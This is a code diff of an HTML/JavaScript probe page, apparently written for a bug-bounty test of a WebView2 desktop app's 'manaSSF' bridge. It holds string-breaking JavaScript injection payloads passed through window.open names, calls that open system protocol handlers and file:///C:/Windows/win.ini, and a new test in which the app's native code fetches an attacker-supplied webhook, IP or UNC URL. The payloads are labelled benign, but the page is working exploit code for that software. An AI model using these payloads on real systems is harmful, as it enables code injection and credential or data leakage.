@@ -2,45 +2,51 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SDA Probe Page v5</title>
+<title>SDA Probe Page v6</title>
 <style>
-  body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:1000px}
+  body{font-family:monospace;background:#111;color:#eee;padding:16px;max-width:1050px}
   button{font-size:15px;padding:9px 12px;margin:5px 4px;cursor:pointer}
   pre{background:#000;padding:12px;border:1px solid #333;white-space:pre-wrap}
   .warn{color:#f90}
-  iframe{width:100%;height:300px;border:2px solid #f90;margin-top:8px}
+  iframe{width:100%;height:260px;border:2px solid #666;margin-top:8px}
+  input{font-size:14px;padding:8px;width:80%;background:#000;color:#0f0;border:1px solid #333}
 </style>
 </head>
 <body>
-<h1>SDA Probe Page v5 (Simons/Carter — yalnızca test VM'inde koş)</h1>
-<p class="warn">Benign payload (badge=1337, toast metni). Sadece kendi test VM'inde ve hackerone pod gözlemi için.</p>
+<h1>SDA Probe Page v6 (Simons/Carter — yalnızca test VM'inde koş)</h1>
+<p class="warn">Benign payload (badge=1337, toast/call metinleri). Sadece kendi test VM'inde ve hackerone pod gözlemi için.</p>
 
-<button id="btnInfo">1) Bilgi Dump (otomatik de çalışır)</button>
-<button id="btnToast">2) F1-TOAST (native toast denemesi)</button>
-<button id="btnProto">3) F1-PROTO (tel: protokol kaydı denemesi)</button>
-<button id="btnF3">4) F3-INJECT (window.open about:blank + payload)</button>
-<button id="btnF3b">5) F3-INJECT (title marker varyantı)</button>
-<button id="btnF4a">6) F4: ms-settings:display (window.open)</button>
-<button id="btnF4b">7) F4: search-ms:query=probe (window.open)</button>
-<button id="btnF4c">8) F4: file:///C:/Windows/win.ini (window.open)</button>
-<button id="btnF4d">9) F4b: ms-settings:display (location.href navigasyon)</button>
-<button id="btnBBox">10) BBox Dump (callbacks durumu)</button>
-<button id="btnNav" style="background:#722;color:#fff">11) NAV TEST: location.href='https://example.com' (allow-all testi — SON test, sayfa gider!)</button>
+<button id="btnInfo">1) Bilgi Dump</button>
+<button id="btnToast">2) F1-TOAST</button>
+<button id="btnProto">3) F1-PROTO</button>
+<button id="btnF3">4) F3-INJECT</button>
+<button id="btnF3b">5) F3-INJECT title</button>
+<button id="btnF4a">6) ms-settings:</button>
+<button id="btnF4b">7) search-ms:</button>
+<button id="btnF4c">8) file://</button>
+<button id="btnF4d">9) location.href ms-settings</button>
+<button id="btnBBox">10) BBox Dump</button>
+<button id="btnNav" style="background:#722;color:#fff">11) NAV TEST example.com (SON, sayfa gider)</button>
 
-<h2 style="color:#f90">▼ IFRAME TEST — gömülü çerçeve (jsDelivr origin) ▼</h2>
-<p class="warn">Aşağıdaki çerçeve FARKLI bir origin'den (cdn.jsdelivr.net) yükleniyor. İçerideki "FRAME F3-INJECT" butonuna tıklayınca sonuçlar hem altta hem üstteki log'a düşer.</p>
+<h2 style="color:#f90">▼ NOTIF TEST — native görsel fetch (yeni bulgu!) ▼</h2>
+<p class="warn">Aşağıya attacker URL'si gir (webhook.site URL'i / http(s)://IP:port/marker.png / <b>\\\\host\\x\\a.png</b> UNC). Buton, köprü komutunu gönderir; uygulama bu URL'i <b>NATIVE tarafta</b> (WPF/WinINet, WebView değil) fetch eder. webhook.site panelinde/yerel log'da isteğin düşmesi = KANIT. Görsel decode edilemese bile ağ isteği gider.</p>
+<input id="atkUrl" size="80" placeholder="https://webhook.site/xxxx-...  veya  http://IP:8000/marker.png  veya  \\host\x\a.png">
+<div>
+  <button id="btnCallIcon">12) CALL: Icon=URL</button>
+  <button id="btnCallCo">13) CALL: CompanyIconUrl=URL</button>
+  <button id="btnToastIcon">14) TOAST: Icon=URL</button>
+</div>
+
+<h2 style="color:#888">▼ IFRAME TEST (v5) ▼</h2>
 <iframe src="https://raw.githack.com/ferattesin/poc-test/main/iframe-child.html" referrerpolicy="no-referrer"></iframe>
 
-<pre id="out">hazır. Bilgi dump için 1'e bas.</pre>
+<pre id="out">hazır.</pre>
 
 <script>
 const out = [];
 function log(k, v){ out.push(k + ": " + v); document.getElementById('out').textContent = out.join("\n"); }
 window.addEventListener('message', function(e){
-  try {
-    var d = e.data;
-    if (d && d.from === 'IFRAME-CHILD') { log('[IFRAME] ' + d.k, d.v); }
-  } catch(err){}
+  try { var d = e.data; if (d && d.from === 'IFRAME-CHILD') { log('[IFRAME] ' + d.k, d.v); } } catch(err){}
 });
 
 function dumpInfo(){
@@ -49,93 +55,74 @@ function dumpInfo(){
   log("location.origin", location.origin);
   log("navigator.userAgent", navigator.userAgent);
   log("window.manaSSF", typeof window.manaSSF);
-  try { log("manaSSF keys", window.manaSSF ? Object.keys(window.manaSSF).join(",") : "n/a"); } catch(e){ log("manaSSF keys.err", e.message); }
   log("chrome.webview", (window.chrome && window.chrome.webview) ? "PRESENT" : "absent");
   try {
     const ho = window.chrome && window.chrome.webview ? window.chrome.webview.hostObjects : null;
     log("hostObjects", ho ? (Object.keys(ho).join(",") || "empty") : "n/a");
-    if (ho) { try { log("hostObjects.manaSSFBridge", typeof ho.manaSSFBridge); } catch(e){ log("ho.bridge.err", e.message); } }
-    if (ho) { try { log("hostObjects.manaSSFBridge.SetBadgeCount", typeof ho.manaSSFBridge.SetBadgeCount); } catch(e){ log("ho.setbadge.err", e.message); } }
+    if (ho) { try { log("ho.manaSSFBridge", typeof ho.manaSSFBridge); } catch(e){ log("ho.err", e.message); } }
   } catch(e){ log("hostObjects.err", e.message); }
-  log("crossOriginIsolated", window.crossOriginIsolated);
-  log("hasOpener", !!window.opener);
 }
-
 document.getElementById('btnInfo').onclick = dumpInfo;
 document.getElementById('btnBBox').onclick = function(){
-  try {
-    log("callbacks", Object.keys(window.manaSSF.callbacks).join(",") || "(bos)");
-    log("notificationCallbacks", Object.keys(window.manaSSF.notificationCallbacks).join(",") || "(bos)");
-    log("isClientReady", window.manaSSF.isClientReady);
-  } catch(e){ log("bbox.err", e.message); }
+  try { log("callbacks", Object.keys(window.manaSSF.callbacks).join(",") || "(bos)"); log("isClientReady", window.manaSSF.isClientReady); }
+  catch(e){ log("bbox.err", e.message); }
 };
 
 window.addEventListener('load', function(){
   dumpInfo();
   try {
-    window.manaSSF.callbacks['boundsChangeCallback'] = function(b){
-      log("boundsChangeCallback FIRED", JSON.stringify(b));
-    };
-    log("setup", "boundsChangeCallback registered (F3 wrapper icin) ✓");
+    window.manaSSF.callbacks['boundsChangeCallback'] = function(b){ log("boundsChangeCallback FIRED", JSON.stringify(b)); };
+    log("setup", "boundsChangeCallback registered ✓");
   } catch(e){ log("setup.err", e.message); }
 });
 
 document.getElementById('btnToast').onclick = function(){
-  try {
-    window.chrome.webview.postMessage({
-      command: "show-toast",
-      payload: { id: "probe-toast-1", title: "SDA PROBE TOAST", body: "origin=" + location.origin, sticky: false }
-    });
-    log("F1-TOAST", "postMessage gönderildi");
-  } catch(e){ log("F1-TOAST.err", e.message); }
+  try { window.chrome.webview.postMessage({command:"show-toast", payload:{id:"probe-toast-1", title:"SDA PROBE TOAST", body:"origin=" + location.origin, sticky:false}}); log("F1-TOAST","gönderildi"); }
+  catch(e){ log("F1-TOAST.err", e.message); }
 };
-
 document.getElementById('btnProto').onclick = function(){
-  try {
-    window.chrome.webview.postMessage({
-      command: "register-phone-number-services",
-      payload: { protocols: ["tel"] }
-    });
-    log("F1-PROTO", "postMessage gönderildi (HKCU gözlemi ProcMon ile)");
-  } catch(e){ log("F1-PROTO.err", e.message); }
+  try { window.chrome.webview.postMessage({command:"register-phone-number-services", payload:{protocols:["tel"]}}); log("F1-PROTO","gönderildi"); }
+  catch(e){ log("F1-PROTO.err", e.message); }
 };
 
 const F3_PAYLOAD_BADGE = "x'});window.manaSSF.setBadgeCount(1337);(function(){return '";
 const F3_PAYLOAD_TITLE = "x'});document.title='SIMONS-PWNED';(function(){return '";
-
 document.getElementById('btnF3').onclick = function(){
-  try {
-    const w = window.open("about:blank", F3_PAYLOAD_BADGE);
-    log("F3-INJECT", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: taskbar badge=1337 + 'boundsChangeCallback FIRED'");
-  } catch(e){ log("F3-INJECT.err", e.message); }
+  try { const w = window.open("about:blank", F3_PAYLOAD_BADGE); log("F3-INJECT","popout=" + (w ? "olustu" : "null")); }
+  catch(e){ log("F3-INJECT.err", e.message); }
 };
-
 document.getElementById('btnF3b').onclick = function(){
-  try {
-    const w = window.open("about:blank", F3_PAYLOAD_TITLE);
-    log("F3-INJECT-title", "window.open çağrıldı; popout=" + (w ? "olustu" : "null") + " | beklenen: ana pencere title=SIMONS-PWNED");
-  } catch(e){ log("F3-INJECT-title.err", e.message); }
+  try { const w = window.open("about:blank", F3_PAYLOAD_TITLE); log("F3-title","popout=" + (w ? "olustu" : "null")); }
+  catch(e){ log("F3-title.err", e.message); }
 };
 
 document.getElementById('btnF4a').onclick = function(){
-  try { const w = window.open("ms-settings:display"); log("F4a ms-settings (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi"); }
-  catch(e){ log("F4a.err", e.message); }
-};
+  try { const w = window.open("ms-settings:display"); log("F4a","null:" + (w===null)); } catch(e){ log("F4a.err", e.message); } };
 document.getElementById('btnF4b').onclick = function(){
-  try { const w = window.open("search-ms:query=probe"); log("F4b search-ms (window.open)", w ? "pencere-ref alindi" : "null — WebView2 harici protokol akisi"); }
-  catch(e){ log("F4b.err", e.message); }
-};
+  try { const w = window.open("search-ms:query=probe"); log("F4b","null:" + (w===null)); } catch(e){ log("F4b.err", e.message); } };
 document.getElementById('btnF4c').onclick = function(){
-  try { const w = window.open("file:///C:/Windows/win.ini"); log("F4c file (window.open)", w ? "pencere-ref alindi" : "null"); }
-  catch(e){ log("F4c.err", e.message); }
-};
+  try { const w = window.open("file:///C:/Windows/win.ini"); log("F4c","null:" + (w===null)); } catch(e){ log("F4c.err", e.message); } };
 document.getElementById('btnF4d').onclick = function(){
-  try { log("F4d", "location.href atanıyor: ms-settings:display"); location.href = "ms-settings:display"; }
-  catch(e){ log("F4d.err", e.message); }
-};
+  try { log("F4d","location.href atanıyor"); location.href = "ms-settings:display"; } catch(e){ log("F4d.err", e.message); } };
 document.getElementById('btnNav').onclick = function(){
-  try { log("NAV-TEST", "location.href='https://example.com' atanıyor — sayfa değişirse allow-all kanıtı ✅"); location.href = "https://example.com/"; }
-  catch(e){ log("NAV-TEST.err", e.message); }
+  try { log("NAV-TEST","example.com'a gidiliyor..."); location.href = "https://example.com/"; } catch(e){ log("NAV.err", e.message); } };
+
+// --- NOTIF TEST ---
+function curUrl(){ return document.getElementById('atkUrl').value.trim(); }
+document.getElementById('btnCallIcon').onclick = function(){
+  const u = curUrl();
+  try { window.chrome.webview.postMessage({command:"call-notification", payload:{ Type:"show-call-notification", Id:9901, Title:"PROBE CALL", CallerName:"PROBE", Icon:u }}); log("NOTIF-CALL icon","gonderildi: " + u); }
+  catch(e){ log("nc.err", e.message); }
+};
+document.getElementById('btnCallCo').onclick = function(){
+  const u = curUrl();
+  try { window.chrome.webview.postMessage({command:"call-notification", payload:{ Type:"show-call-notification", Id:9902, Title:"PROBE CALL 2", CallerName:"PROBE", Company:"ACME", CompanyIconUrl:u }}); log("NOTIF-CALL companyIcon","gonderildi: " + u); }
+  catch(e){ log("ncc.err", e.message); }
+};
+document.getElementById('btnToastIcon').onclick = function(){
+  const u = curUrl();
+  try { window.chrome.webview.postMessage({command:"show-toast", payload:{ Id:9903, Title:"PROBE TOAST", Body:"notif probe", Icon:u }}); log("NOTIF-TOAST icon","gonderildi: " + u); }
+  catch(e){ log("nt.err", e.message); }
 };
 </script>
 </body>
